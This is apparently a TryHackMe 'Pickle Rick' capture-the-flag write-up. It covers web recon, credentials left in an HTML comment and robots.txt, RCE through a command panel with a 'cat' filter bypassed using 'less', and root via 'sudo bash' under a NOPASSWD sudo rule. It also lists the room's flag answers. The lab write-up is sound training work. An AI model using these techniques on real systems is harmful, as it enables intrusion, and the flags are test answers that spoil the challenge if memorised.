#  Pickle Rick

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Web / RCE / Linux PrivEsc  
> **Date Completed:** 2026-04-18  
> **Room Link:** [https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)

---

##  Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Privilege Escalation](#privilege-escalation)
6. [Flags / Ingredients](#flags--ingredients)
7. [Key Takeaways](#key-takeaways)

---

##  Room Overview

Rick has turned himself into a pickle (again) and needs Morty to log into his computer to find three secret ingredients for his pickle-reverse potion. The challenge involves credential harvesting from exposed web assets, exploiting a **Remote Code Execution (RCE)** command panel, and escalating to root via a misconfigured `sudo` policy.

**Goal:**  
Find all three secret ingredients hidden across the system.

**Skills Practiced:**  
Source code review, `robots.txt` recon, Gobuster directory bruteforcing, web-based RCE, command filter bypass, Linux sudo privesc.

---

##  Reconnaissance

### Network Scanning

```bash
nmap -sC -sV 10.48.170.21
```

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH |
| 80   | HTTP    | Apache  |

---

##  Enumeration

### Web Application

Visiting `http://10.48.170.21/` loads a Rick and Morty themed page with a plea from Rick asking Morty to log into his computer:

> *"I need you to BURRRP.... Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion."*

### Source Code Review

Inspecting the HTML source reveals a developer note left in a comment:

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

**Username found: `R1ckRul3s`**

### robots.txt

Navigating to `http://10.48.170.21/robots.txt` reveals:

```
Wubbalubbadubdub
```

**Password found: `Wubbalubbadubdub`**

### Directory Bruteforcing

```bash
gobuster dir -u http://10.48.170.21 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50
```

**Findings:**
- `/assets` — static assets directory
- `login.php` — login portal
- `portal.php` — authenticated command panel
- `robots.txt`, `clue.txt`, `denied.php`

---

##  Exploitation

### Vulnerability

**Type:** Remote Code Execution (RCE) via unauthenticated command panel (post-login)  
**CVE:** N/A  
**Description:**  
After logging in with the credentials found during recon, the portal exposes a **Command Panel** at `portal.php` that executes arbitrary system commands directly on the server. Some commands (like `cat`) are filtered, but the filter is easily bypassed.

---

### Steps

**Step 1 — Log in**

Navigate to `http://10.48.170.21/login.php` and enter:

```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

Redirected to `portal.php` — the Rick Portal Command Panel.

**Step 2 — List the web root**

Enter `ls` in the command input and click Execute:

```bash
ls
```

Output:
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

The file `Sup3rS3cretPickl3Ingred.txt` is immediately suspicious.

**Step 3 — Bypass the `cat` filter**

Attempting `cat Sup3rS3cretPickl3Ingred.txt` is blocked:

> *"Command disabled to make it hard for future PICKLEEEE RICCCKKKKK."*

`cat` is blacklisted — use `less` instead:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

**First Ingredient: `mr. meeseek hair`**

**Step 4 — Read the clue**

```bash
less clue.txt
```

Output hints to look around the rest of the system files.

**Step 5 — Find the second ingredient**

```bash
less /home/rick/second\ ingredients
```

**Second Ingredient: `1 jerry tear`**

---

##  Privilege Escalation

### Enumeration

```bash
sudo -l
```

Output:
```
User www-data may run the following commands:
    (ALL) NOPASSWD: ALL
```

The web server user can run **any command as root with no password** — a critical misconfiguration.

### Escalation Steps

**Step 1 — Spawn a root shell**

```bash
sudo bash
```

Now running as `root`.

**Step 2 — List the root directory**

```bash
ls /root
```

Output includes `3rd.txt`.

**Step 3 — Read the final ingredient**

```bash
less /root/3rd.txt
```

**Third Ingredient: `fleeb juice`**

---

##  Flags / Ingredients

| Ingredient | Value | Location |
|------------|-------|----------|
| 1st | `mr. meeseek hair` | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` |
| 2nd | `1 jerry tear` | `/home/rick/second ingredients` |
| 3rd | `fleeb juice` | `/root/3rd.txt` |

---

##  Key Takeaways

- **Never leave credentials in HTML comments or `robots.txt`.** Both are publicly accessible with zero authentication — a basic OSINT check reveals them instantly.
- **A command panel with no input sanitisation = full RCE.** Blacklisting specific commands like `cat` is security theatre — `less`, `more`, `strings`, `tac`, and many others can all read files.
- **`sudo -l` should always be the first privesc check.** `NOPASSWD: ALL` is as catastrophic as it gets — instant root from any user context.
- **Least privilege matters.** The Apache/web user should never have sudo rights, let alone unrestricted ones.

---

##  Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port & service scanning |
| Gobuster | Directory bruteforcing |
| Browser DevTools / View Source | Credential discovery in HTML comments |
| Browser URL bar | Manual navigation to `robots.txt`, `login.php` |
| Web Command Panel | RCE execution via `less` |

---

##  References

- [OWASP — OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [GTFOBins — less](https://gtfobins.github.io/gtfobins/less/)
- [HackTricks — Sudo Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid)

---

*Writeup by Avaneesh*
